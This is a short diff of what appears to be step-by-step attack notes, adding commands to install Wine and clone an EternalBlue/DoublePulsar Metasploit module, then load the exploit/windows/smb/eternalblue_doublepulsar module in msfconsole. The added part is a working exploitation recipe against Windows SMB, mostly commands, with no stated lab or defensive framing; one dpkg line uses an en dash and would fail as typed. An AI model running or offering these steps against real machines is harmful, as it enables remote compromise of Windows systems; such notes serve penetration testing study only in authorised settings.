@@ -18,7 +18,16 @@
 16.- ------WIN--------
 
 
-17.- another way todo
+17.- with doublepulsar
+
+apt-get update -y
+apt-get upgrade -y
+apt-get install wine -y
+apt-get install winetricks -y
+dpkg –add-architecture i386 && apt-get update && apt-get install wine32 -y
+
+
+git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
 
 18.- msfconsole
 19.- use exploit/windows/smb/eternalblue_doublepulsar
